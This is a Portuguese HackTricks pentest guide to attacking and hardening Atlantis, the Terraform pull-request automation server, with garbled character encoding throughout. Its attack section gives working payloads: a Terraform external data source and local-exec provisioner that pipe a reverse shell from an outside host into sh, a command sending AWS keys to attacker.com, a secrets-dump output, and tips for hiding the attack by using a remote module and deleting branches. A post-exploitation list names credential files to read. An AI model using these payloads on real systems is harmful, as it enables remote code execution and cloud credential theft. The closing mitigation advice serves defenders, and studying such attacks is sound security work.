# Seguran√ßa do Atlantis

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Informa√ß√µes B√°sicas

O Atlantis basicamente ajuda voc√™ a executar o terraform a partir de Pull Requests do seu servidor git.

![](<../.gitbook/assets/image (51).png>)

## Laborat√≥rio Local

1. Acesse a **p√°gina de lan√ßamentos do atlantis** em [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) e **baixe** a vers√£o que for adequada para voc√™.
2. Crie um **token pessoal** (com acesso ao reposit√≥rio) do seu usu√°rio no **github**
3. Execute `./atlantis testdrive` e ele criar√° um **reposit√≥rio de demonstra√ß√£o** que voc√™ pode usar para **interagir com o atlantis**
4. Voc√™ pode acessar a p√°gina web em 127.0.0.1:4141

## Acesso ao Atlantis

### Credenciais do Servidor Git

O **Atlantis** suporta v√°rios hosts git como **Github**, **Gitlab**, **Bitbucket** e **Azure DevOps**.\
No entanto, para acessar os reposit√≥rios nessas plataformas e realizar a√ß√µes, ele precisa ter algum **acesso privilegiado concedido a eles** (pelo menos permiss√µes de escrita).\
[**A documenta√ß√£o**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) incentiva a cria√ß√£o de um usu√°rio nessas plataformas especificamente para o Atlantis, mas algumas pessoas podem usar contas pessoais.

{% hint style="warning" %}
De qualquer forma, do ponto de vista de um atacante, a **conta do Atlantis** ser√° um alvo muito **interessante** **para comprometer**.
{% endhint %}

### Webhooks

O Atlantis usa opcionalmente [**Segredos de Webhook**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) para validar que os **webhooks** que recebe do seu host Git s√£o **leg√≠timos**.

Uma maneira de confirmar isso seria **permitir apenas solicita√ß√µes vindas dos IPs** do seu host Git, mas uma maneira mais f√°cil √© usar um Segredo de Webhook.

Note que, a menos que voc√™ use um servidor privado do github ou bitbucket, voc√™ precisar√° expor os endpoints de webhook para a Internet.

{% hint style="warning" %}
O Atlantis vai estar **expondo webhooks** para que o servidor git possa enviar informa√ß√µes. Do ponto de vista de um atacante, seria interessante saber **se voc√™ pode enviar mensagens** para ele.
{% endhint %}

### Credenciais do Provedor <a href="#provider-credentials" id="provider-credentials"></a>

[Conforme a documenta√ß√£o:](https://www.runatlantis.io/docs/provider-credentials.html)

O Atlantis executa o Terraform simplesmente **executando os comandos `terraform plan` e `apply`** no servidor onde o **Atlantis est√° hospedado**. Assim como quando voc√™ executa o Terraform localmente, o Atlantis precisa de credenciais para o seu provedor espec√≠fico.

Cabe a voc√™ como voc√™ [fornece credenciais](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) para o seu provedor espec√≠fico ao Atlantis:

* O [Gr√°fico Helm](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) do Atlantis e o [M√≥dulo AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) t√™m seus pr√≥prios mecanismos para credenciais de provedor. Leia a documenta√ß√£o deles.
* Se voc√™ est√° executando o Atlantis na nuvem, muitas nuvens t√™m maneiras de dar acesso √† API da nuvem para aplica√ß√µes que est√£o rodando nelas, por exemplo:
* [Fun√ß√µes do AWS EC2](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Procure por "Fun√ß√£o EC2")
* [Contas de Servi√ßo de Inst√¢ncia do GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Muitos usu√°rios configuram vari√°veis de ambiente, por exemplo, `AWS_ACCESS_KEY`, onde o Atlantis est√° rodando.
* Outros criam os arquivos de configura√ß√£o necess√°rios, por exemplo, `~/.aws/credentials`, onde o Atlantis est√° rodando.
* Use o [Provedor HashiCorp Vault](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) para obter credenciais de provedor.

{% hint style="warning" %}
O **container** onde o **Atlantis** est√° **executando** provavelmente **conter√° credenciais privilegiadas** para os provedores (AWS, GCP, Github...) que o Atlantis est√° gerenciando via Terraform.
{% endhint %}

### P√°gina Web

Por padr√£o, o Atlantis executar√° uma **p√°gina web na porta 4141 em localhost**. Esta p√°gina apenas permite que voc√™ habilite/desabilite o atlantis apply e verifique o status do plano dos reposit√≥rios e os desbloqueie (ela n√£o permite modificar coisas, ent√£o n√£o √© t√£o √∫til).

Provavelmente voc√™ n√£o a encontrar√° exposta na internet, mas parece que por padr√£o **nenhuma credencial √© necess√°ria** para acess√°-la (e se forem necess√°rias, `atlantis`:`atlantis` s√£o as **padr√£o**).

## Configura√ß√£o do Servidor

A configura√ß√£o para `atlantis server` pode ser especificada via flags de linha de comando, vari√°veis de ambiente, um arquivo de configura√ß√£o ou uma mistura dos tr√™s.

* Voc√™ pode encontrar [**aqui a lista de flags**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) suportadas pelo servidor do Atlantis
* Voc√™ pode encontrar [**aqui como transformar uma op√ß√£o de configura√ß√£o em uma var de ambiente**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Os valores s√£o **escolhidos nesta ordem**:

1. Flags
2. Vari√°veis de Ambiente
3. Arquivo de Configura√ß√£o

{% hint style="warning" %}
Note que na configura√ß√£o voc√™ pode encontrar valores interessantes como **tokens e senhas**.
{% endhint %}

### Configura√ß√£o dos Reposit√≥rios

Algumas configura√ß√µes afetam **como os reposit√≥rios s√£o gerenciados**. No entanto, √© poss√≠vel que **cada reposit√≥rio exija configura√ß√µes diferentes**, ent√£o existem maneiras de especificar cada um deles. Esta √© a ordem de prioridade:

1. Arquivo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) do reposit√≥rio. Este arquivo pode ser usado para especificar como o atlantis deve tratar o reposit√≥rio. No entanto, por padr√£o, algumas chaves n√£o podem ser especificadas aqui sem algumas flags permitindo isso.
2. Provavelmente √© necess√°rio ser permitido por flags como `allowed_overrides` ou `allow_custom_workflows`
3. [**Configura√ß√£o do Lado do Servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Voc√™ pode pass√°-la com a flag `--repo-config` e √© um yaml configurando novas configura√ß√µes para cada reposit√≥rio (regexes suportados)
4. Valores **Padr√£o**

#### Prote√ß√µes de PR

O Atlantis permite indicar se voc√™ quer que o **PR** seja **`aprovado`** por outra pessoa (mesmo que isso n√£o esteja configurado na prote√ß√£o do branch) e/ou seja **`mescl√°vel`** (prote√ß√µes do branch passadas) **antes de executar o apply**. Do ponto de vista de seguran√ßa, √© recomendado configurar ambas as op√ß√µes.

Caso `allowed_overrides` seja Verdadeiro, essas configura√ß√µes podem ser **sobrescritas em cada projeto pelo arquivo `/atlantis.yml`**.

#### Scripts

A configura√ß√£o do reposit√≥rio pode **especificar scripts** para serem executados [**antes**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) e [**depois**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) de um **workflow ser executado.**

N√£o h√° op√ß√£o para **especificar** esses scripts no arquivo **`/atlantis.yml`** do reposit√≥rio.

#### Workflow

Na configura√ß√£o do reposit√≥rio (configura√ß√£o do lado do servidor), voc√™ pode [**especificar um novo workflow padr√£o**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), ou [**criar novos workflows personalizados**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Voc√™ tamb√©m pode **especificar** quais **reposit√≥rios** podem **acessar** os **novos** gerados.\
Ent√£o, voc√™ pode permitir que o arquivo **atlantis.yaml** de cada reposit√≥rio **especifique o workflow a ser usado.**

{% hint style="danger" %}
Se a flag de [**configura√ß√£o do lado do servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` estiver configurada para **Verdadeiro**, workflows podem ser **especificados** no arquivo **`atlantis.yaml`** de cada reposit√≥rio. Tamb√©m pode ser necess√°rio que **`allowed_overrides`** especifique tamb√©m **`workflow`** para **sobrescrever o workflow** que ser√° usado.\
Isso basicamente dar√° **RCE no servidor do Atlantis para qualquer usu√°rio que possa acessar esse reposit√≥rio**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Verifica√ß√£o de Pol√≠tica Conftest

O Atlantis suporta a execu√ß√£o de **pol√≠ticas** [**conftest**](https://www.conftest.dev/) **do lado do servidor** contra a sa√≠da do plano. Casos de uso comuns para usar esta etapa incluem:

* Negar o uso de uma lista de m√≥dulos
* Afirmar atributos de um recurso no momento da cria√ß√£o
* Capturar exclus√µes de recursos n√£o intencionais
* Prevenir riscos de seguran√ßa (por exemplo, expor portas seguras ao p√∫blico)

Voc√™ pode verificar como configurar isso em [**a documenta√ß√£o**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Comandos do Atlantis

[**Na documenta√ß√£o**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) voc√™ pode encontrar as op√ß√µes que pode usar para executar o Atlantis:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Ataques

{% hint style="warning" %}
Se durante a explora√ß√£o voc√™ encontrar este **erro**: `Error: Error acquiring the state lock`

Voc√™ pode corrigi-lo executando:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### RCE no plano Atlantis - Modifica√ß√£o de configura√ß√£o em novo PR

Se voc√™ tem acesso de escrita a um reposit√≥rio, poder√° criar um novo branch nele e gerar um PR. Se voc√™ puder **executar `atlantis plan`** (ou talvez seja executado automaticamente) **voc√™ poder√° realizar RCE dentro do servidor Atlantis**.

Voc√™ pode fazer isso fazendo com que o [**Atlantis carregue uma fonte de dados externa**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Basta colocar um payload como o seguinte no arquivo `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Ataque Mais Furtivo

Voc√™ pode realizar este ataque de uma forma ainda mais **furtiva**, seguindo estas sugest√µes:

* Em vez de adicionar o rev shell diretamente no arquivo terraform, voc√™ pode **carregar um recurso externo** que cont√©m o rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Voc√™ pode encontrar o c√≥digo rev shell em [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

* No recurso externo, use o recurso **ref** para ocultar o **c√≥digo terraform rev shell em um branch** dentro do reposit√≥rio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Em vez** de criar um **PR para o master** para acionar o Atlantis, **crie 2 branches** (test1 e test2) e crie um **PR de um para o outro**. Quando voc√™ tiver completado o ataque, apenas **remova o PR e os branches**.

### Atlantis plan Secrets Dump

Voc√™ pode **despejar segredos usados pelo terraform** executando `atlantis plan` (`terraform plan`) colocando algo assim no arquivo terraform:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis apply RCE - Modifica√ß√£o de configura√ß√£o em novo PR

Se voc√™ tem acesso de escrita em um reposit√≥rio, poder√° criar uma nova branch nele e gerar um PR. Se voc√™ pode **executar `atlantis apply` voc√™ ser√° capaz de realizar RCE dentro do servidor Atlantis**.

No entanto, geralmente ser√° necess√°rio contornar algumas prote√ß√µes:

* **Mergeable**: Se essa prote√ß√£o estiver configurada no Atlantis, voc√™ s√≥ pode executar **`atlantis apply` se o PR for mescl√°vel** (o que significa que a prote√ß√£o da branch precisa ser contornada).
* Verifique poss√≠veis [**contornos de prote√ß√µes de branch**](broken-reference/)
* **Aprovado**: Se essa prote√ß√£o estiver configurada no Atlantis, **outro usu√°rio deve aprovar o PR** antes de voc√™ poder executar `atlantis apply`
* Por padr√£o, voc√™ pode abusar do [**token do Gitbot para contornar essa prote√ß√£o**](broken-reference/)

Executando **`terraform apply` em um arquivo Terraform malicioso com** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Voc√™ s√≥ precisa garantir que algum payload como os seguintes termine no arquivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Siga as **sugest√µes da t√©cnica anterior** para realizar este ataque de uma maneira **mais discreta**.

### Inje√ß√£o de Par√¢metro no Terraform

Ao executar `atlantis plan` ou `atlantis apply`, o terraform √© executado por baixo dos panos, voc√™ pode passar comandos para o terraform a partir do atlantis comentando algo como:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Voc√™ pode passar vari√°veis de ambiente que podem ser √∫teis para contornar algumas prote√ß√µes. Verifique as vari√°veis de ambiente do terraform em [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Fluxo de Trabalho Personalizado

Executando **comandos de build maliciosos personalizados** especificados em um arquivo `atlantis.yaml`. O Atlantis usa o arquivo `atlantis.yaml` da branch do pull request, **n√£o** do `master`.\
Essa possibilidade foi mencionada em uma se√ß√£o anterior:

{% hint style="danger" %}
Se a flag de [**configura√ß√£o do lado do servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` estiver definida como **True**, workflows podem ser **especificados** no arquivo **`atlantis.yaml`** de cada reposit√≥rio. Tamb√©m pode ser necess√°rio que **`allowed_overrides`** especifique tamb√©m **`workflow`** para **substituir o workflow** que ser√° usado.

Isso basicamente dar√° **RCE no servidor Atlantis a qualquer usu√°rio que possa acessar esse reposit√≥rio**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Contornar prote√ß√µes de plan/apply

Se a flag de [**configura√ß√£o do lado do servidor**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _tiver_ `apply_requirements` configurada, √© poss√≠vel para um reposit√≥rio **modificar as prote√ß√µes de plan/apply para contorn√°-las**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### Sequestro de PR

Se algu√©m enviar **coment√°rios `atlantis plan/apply` em seus pull requests v√°lidos,** isso far√° com que o terraform seja executado quando voc√™ n√£o deseja.

Al√©m disso, se voc√™ n√£o tiver configurado na **prote√ß√£o de branch** para solicitar a **reevalua√ß√£o** de cada PR quando um **novo commit for enviado** para ele, algu√©m poderia **escrever configura√ß√µes maliciosas** (ver cen√°rios anteriores) no config do terraform, executar `atlantis plan/apply` e obter RCE.

Esta √© a **configura√ß√£o** nas prote√ß√µes de branch do Github:

![](<../.gitbook/assets/image (31).png>)

### Segredo do Webhook

Se voc√™ conseguir **roubar o segredo do webhook** usado ou se **n√£o houver nenhum segredo do webhook** sendo usado, voc√™ poderia **chamar o webhook do Atlantis** e **invocar comandos do atlatis** diretamente.

### Bitbucket

O Bitbucket Cloud **n√£o suporta segredos de webhook**. Isso poderia permitir que atacantes **falsificassem solicita√ß√µes do Bitbucket**. Certifique-se de permitir apenas IPs do Bitbucket.

* Isso significa que um **atacante** poderia fazer **solicita√ß√µes falsas ao Atlantis** que parecem vir do Bitbucket.
* Se voc√™ estiver especificando `--repo-allowlist`, eles s√≥ poderiam falsificar solicita√ß√µes relacionadas a esses reposit√≥rios, ent√£o o m√°ximo de dano que poderiam fazer seria plan/apply em seus pr√≥prios reposit√≥rios.
* Para evitar isso, coloque na lista de permiss√µes [os endere√ßos IP do Bitbucket](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (veja Endere√ßos IPv4 de sa√≠da).

## P√≥s-Explora√ß√£o

Se voc√™ conseguiu acesso ao servidor ou pelo menos obteve um LFI, h√° algumas coisas interessantes que voc√™ deve tentar ler:

* `/home/atlantis/.git-credentials` Cont√©m credenciais de acesso ao vcs
* `/atlantis-data/atlantis.db` Cont√©m credenciais de acesso ao vcs com mais informa√ß√µes
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Arquivo de estado do Terraform
* Exemplo: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Vari√°veis de ambiente
* `/proc/[2-20]/cmdline` Linha de comando do `atlantis server` (pode conter dados sens√≠veis)

## Mitiga√ß√µes

### N√£o Use em Repos P√∫blicos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Como qualquer pessoa pode comentar em pull requests p√∫blicos, mesmo com todas as mitiga√ß√£o de seguran√ßa dispon√≠veis, ainda √© perigoso executar o Atlantis em reposit√≥rios p√∫blicos sem a configura√ß√£o adequada das configura√ß√µes de seguran√ßa.

### N√£o Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Se voc√™ estiver executando em um reposit√≥rio p√∫blico (o que n√£o √© recomendado, veja acima), voc√™ n√£o deve definir `--allow-fork-prs` (padr√£o √© falso) porque qualquer pessoa pode abrir um pull request do seu fork para o seu reposit√≥rio.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

O Atlantis exige que voc√™ especifique uma lista de permiss√µes de reposit√≥rios dos quais aceitar√° webhooks atrav√©s da flag `--repo-allowlist`. Por exemplo:

* Reposit√≥rios espec√≠ficos: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Toda a sua organiza√ß√£o: `--repo-allowlist=github.com/runatlantis/*`
* Todos os reposit√≥rios na sua instala√ß√£o do GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* Todos os reposit√≥rios: `--repo-allowlist=*`. √ötil quando voc√™ est√° em uma rede protegida, mas perigoso sem tamb√©m definir um segredo de webhook.

Essa flag garante que sua instala√ß√£o do Atlantis n√£o esteja sendo usada com reposit√≥rios que voc√™ n√£o controla. Veja `atlantis server --help` para mais detalhes.

### Proteja o Planejamento do Terraform <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Se atacantes submetendo pull requests com c√≥digo Terraform malicioso fazem parte do seu modelo de amea√ßas, ent√£o voc√™ deve estar ciente de que aprova√ß√µes de `terraform apply` n√£o s√£o suficientes. √â poss√≠vel executar c√≥digo malicioso em um `terraform plan` usando a [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ou especificando um provedor malicioso. Esse c√≥digo poderia ent√£o exfiltrar suas credenciais.

Para evitar isso, voc√™ poderia:

1. Incorporar provedores na imagem do Atlantis ou host e negar sa√≠da em produ√ß√£o.
2. Implementar o protocolo de registro de provedor internamente e negar sa√≠da p√∫blica, dessa forma voc√™ controla quem tem acesso de escrita ao registro.
3. Modificar a configura√ß√£o do reposit√≥rio do lado do servidor [server-side repo configuration](https://www.runatlantis.io/docs/server-side-repo-config.html)'s `plan` para validar contra o uso de provedores ou fontes de dados n√£o permitidos ou PRs de usu√°rios n√£o permitidos. Voc√™ tamb√©m poderia adicionar valida√ß√£o extra neste ponto, por exemplo, exigindo um "joinha" no PR antes de permitir que o `plan` continue. Conftest poderia ser √∫til aqui.

### Segredos de Webhook <a href="#webhook-secrets" id="webhook-secrets"></a>

O Atlantis deve ser executado com segredos de Webhook definidos atrav√©s das vari√°veis de ambiente `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Mesmo com a flag `--repo-allowlist` definida, sem um segredo de webhook, atacantes poderiam fazer solicita√ß√µes ao Atlantis se passando por um reposit√≥rio que est√° na lista de permiss√µes. Segredos de webhook garantem que as solicita√ß√µes de webhook est√£o realmente vindo do seu provedor de VCS (GitHub ou GitLab).

Se voc√™ estiver usando o Azure DevOps, em vez de segredos de webhook, adicione um nome de usu√°rio e senha b√°sicos.

### Autentica√ß√£o B√°sica do Azure DevOps <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

O Azure DevOps suporta o envio de um cabe√ßalho de autentica√ß√£o b√°sica em todos os eventos de webhook. Isso requer o uso de uma URL HTTPS para o local do seu webhook.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Se voc√™ estiver usando segredos de webhook, mas seu tr√°fego for por HTTP, ent√£o os segredos de webhook poderiam ser roubados. Habilite SSL/HTTPS usando as flags `--ssl-cert-file` e `--ssl-key-file`.

### Habilite Autentica√ß√£o no Servidor Web do Atlantis <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

√â altamente recomendado habilitar autentica√ß√£o no servi√ßo web. Habilite BasicAuth usando as flags `--web-basic-auth=true` e configure um nome de usu√°rio e uma senha usando `--web-username=seuNomeDeUsuario` e `--web-password=suaSenha`.

Voc√™ tamb√©m pode passar essas como vari√°veis de ambiente `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=seuNomeDeUsuario` e `ATLANTIS_WEB_PASSWORD=suaSenha`.

## Refer√™ncias

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
